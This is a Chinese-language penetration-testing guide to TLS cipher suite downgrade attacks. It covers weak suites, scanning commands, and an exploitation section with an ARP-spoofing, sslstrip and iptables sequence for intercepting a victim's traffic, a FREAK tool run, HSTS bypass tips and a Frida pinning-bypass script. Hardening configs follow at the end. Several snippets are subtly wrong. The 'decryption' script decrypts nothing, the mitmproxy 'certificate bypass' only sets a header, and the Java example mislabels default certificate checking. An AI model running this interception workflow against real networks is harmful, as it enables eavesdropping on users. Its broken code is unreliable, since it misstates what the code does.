# 加密套件降级攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供一套标准化、可复现的加密套件降级攻击测试流程。通过本方法论，测试人员可以检测目标系统是否存在 TLS/SSL 协议降级漏洞，利用弱加密套件窃取或篡改加密通信数据。

### 1.2 适用范围
本文档适用于以下场景：
- 支持多版本 TLS/SSL 协议的 Web 服务器
- 配置了弱加密套件的应用系统
- 金融、电商等对传输安全要求较高的业务系统
- 遗留系统与现代客户端的兼容性场景

### 1.3 读者对象
- 渗透测试工程师
- 安全分析师
- 网络安全研究员
- 安全配置审计人员

---

## 第二部分：核心渗透技术专题

### 专题一：加密套件降级攻击

#### 2.1 技术介绍

**加密套件降级攻击**（Cipher Suite Downgrade Attack）是一种利用 TLS/SSL 握手协议缺陷的攻击技术。攻击者通过干扰客户端与服务器的协议协商过程，迫使双方使用较弱的加密算法或协议版本进行通信。

**攻击原理：**
1. TLS 握手过程中，客户端发送支持的加密套件列表
2. 攻击者拦截并篡改该列表，仅保留弱加密套件
3. 服务器接受弱加密套件，建立不安全的加密连接
4. 攻击者利用弱加密算法的弱点解密通信内容

**常见弱加密套件类型：**
| 类型 | 示例 | 风险等级 |
|------|------|----------|
| 导出级加密 | `TLS_RSA_EXPORT_WITH_RC4_40_MD5` | 高危 |
| RC4 流加密 | `TLS_RSA_WITH_RC4_128_SHA` | 高危 |
| DES/3DES | `TLS_RSA_WITH_DES_CBC_SHA` | 高危 |
| 空加密 | `TLS_RSA_WITH_NULL_SHA` | 严重 |
| MD5 哈希 | `TLS_RSA_WITH_RC4_128_MD5` | 中危 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 传统金融系统 | 银行网银、支付接口 | 为兼容旧系统保留弱加密套件 |
| 政府机构网站 | 政务服务平台 | 使用过时的 SSL/TLS 配置 |
| 企业内部系统 | OA 系统、ERP 系统 | 缺乏安全配置更新 |
| IoT 设备管理后台 | 设备监控平台 | 嵌入式设备 TLS 实现存在缺陷 |
| API 网关 | RESTful API、GraphQL | 配置不当导致支持弱加密 |

#### 2.3 漏洞发现方法

##### 2.3.1 黑盒测试

**步骤 1：TLS 配置扫描**
```bash
# 使用 Nmap 检测支持的加密套件
nmap --script ssl-enum-ciphers -p 443 target.com

# 使用 OpenSSL 测试连接
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_1
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -ssl3
```

**步骤 2：弱加密套件检测**
```bash
# 测试 RC4 加密套件
openssl s_client -connect target.com:443 -cipher 'RC4'

# 测试 DES/3DES 加密套件
openssl s_client -connect target.com:443 -cipher 'DES'
openssl s_client -connect target.com:443 -cipher '3DES'

# 测试空加密
openssl s_client -connect target.com:443 -cipher 'NULL'
```

**步骤 3：使用专业工具扫描**
```bash
# 使用 testssl.sh 进行完整 TLS 审计
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh target.com:443

# 使用 SSLyze
sslyze --regular target.com:443
```

##### 2.3.2 白盒测试

**检查 Web 服务器配置：**

```nginx
# Nginx 不安全配置示例
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;  # 包含过时协议
ssl_ciphers ALL:!aNULL:!eNULL;        # 加密套件过于宽泛
```

```apache
# Apache 不安全配置示例
SSLProtocol all -SSLv3              # 未禁用 TLS 1.0/1.1
SSLCipherSuite HIGH:MEDIUM:!aNULL   # 包含 MEDIUM 强度加密
```

**检查应用程序配置：**
```java
// Java 不安全配置示例
SSLContext context = SSLContext.getInstance("TLS");
context.init(null, null, null);  // 使用默认 TrustManager，不验证证书
```

#### 2.4 漏洞利用方法

##### 2.4.1 使用 SSLstrip 进行降级攻击

```bash
# 1. 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 设置 ARP 欺骗
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip

# 3. 启动 SSLstrip
sslstrip -l 8080 -w output.log

# 4. 配置 iptables 重定向流量
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
```

##### 2.4.2 使用 FREAK 攻击利用导出级加密

```bash
# 检测 FREAK 漏洞
openssl s_client -connect target.com:443 -cipher 'EXPORT'

# 如果存在漏洞，使用专用工具攻击
git clone https://github.com/ANSSI-FR/freak.git
cd freak
python3 client_freak.py target.com
```

##### 2.4.3 使用 Logjam 攻击

```bash
# 检测 Logjam 漏洞
nmap --script ssl-dh-params -p 443 target.com

# 如果 DH 参数小于 1024 位，可实施攻击
# 需要大量计算资源，实际攻击中较少使用
```

##### 2.4.4 中间人解密通信

```python
#!/usr/bin/env python3
"""
弱加密套件流量解密示例
"""
from scapy.all import *
import ssl
import socket

def intercept_tls_traffic(interface, target_ip):
    """拦截并尝试解密 TLS 流量"""
    # 检测弱加密套件
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    # 强制使用弱加密套件
    context.set_ciphers('RC4:DES:EXPORT:NULL')
    
    try:
        conn = context.wrap_socket(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            server_hostname=target_ip
        )
        conn.connect((target_ip, 443))
        print(f"[*] 成功使用弱加密套件连接 {target_ip}")
        print(f"[*] 加密套件：{conn.cipher()}")
    except Exception as e:
        print(f"[-] 连接失败：{e}")
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 HSTS 保护

**方法 1：针对未包含子域名的 HSTS**
```bash
# 如果 HSTS 未设置 includeSubDomains，攻击子域名
# 访问 http://www.target.com 而非 https://target.com
```

**方法 2：利用 HSTS 过期**
```bash
# 等待 HSTS 缓存过期后攻击
# 或使用 SSLstrip 2 在首次访问前拦截
```

##### 2.5.2 绕过证书验证

```python
# 使用自签名证书进行中间人攻击
from mitmproxy import ctx

def request(flow):
    # 移除证书验证
    flow.request.headers["X-Forwarded-Proto"] = "http"
    return flow
```

##### 2.5.3 针对证书固定（Certificate Pinning）的绕过

```bash
# 使用 Frida 绕过移动端证书固定
frida -U -f com.example.app -l bypass-pinning.js

# bypass-pinning.js 内容示例
Java.perform(function() {
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    ).implementation = function(key, trust, random) {
        // 使用空 TrustManager
        this.init(key, null, random);
    };
});
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 命令/工具 | 说明 |
|-----|----------|------|
| 扫描 | `nmap --script ssl-enum-ciphers` | 枚举支持的加密套件 |
| 扫描 | `testssl.sh target:443` | 完整 TLS 配置审计 |
| 扫描 | `sslyze --regular target:443` | 快速 SSL/TLS 检测 |
| 攻击 | `sslstrip -l 8080` | TLS 降级攻击 |
| 攻击 | `openssl s_client -cipher 'EXPORT'` | 测试导出级加密 |
| 利用 | `arpspoof -i eth0 -t victim gateway` | ARP 欺骗 |

### 3.2 弱加密套件识别表

| 加密套件名称 | 强度 | 风险 | 建议 |
|-------------|------|------|------|
| `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` | 强 | 低 | 推荐使用 |
| `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` | 强 | 低 | 推荐使用 |
| `TLS_RSA_WITH_AES_256_CBC_SHA256` | 中 | 中 | 考虑移除 |
| `TLS_RSA_WITH_AES_128_CBC_SHA` | 中 | 中 | 考虑移除 |
| `TLS_RSA_WITH_3DES_EDE_CBC_SHA` | 弱 | 高 | 立即移除 |
| `TLS_RSA_WITH_RC4_128_SHA` | 弱 | 高 | 立即移除 |
| `TLS_RSA_WITH_RC4_128_MD5` | 弱 | 高 | 立即移除 |
| `TLS_RSA_EXPORT_WITH_RC4_40_MD5` | 极弱 | 严重 | 立即移除 |
| `TLS_RSA_WITH_NULL_SHA` | 无加密 | 严重 | 立即移除 |

### 3.3 安全配置建议

**Nginx 安全配置：**
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
```

**Apache 安全配置：**
```apache
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder on
```

---

## 参考资源

- [OWASP TLS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [RFC 7568 - Deprecating SSL 3.0](https://tools.ietf.org/html/rfc7568)
- [NIST SP 800-52 Rev. 2 - TLS Guidelines](https://csrc.nist.gov/publications/detail/sp/800-52/rev-2/final)
- [SSL Labs Server Test](https://www.ssllabs.com/ssltest/)
- [Cipher Suite Registry](https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml)
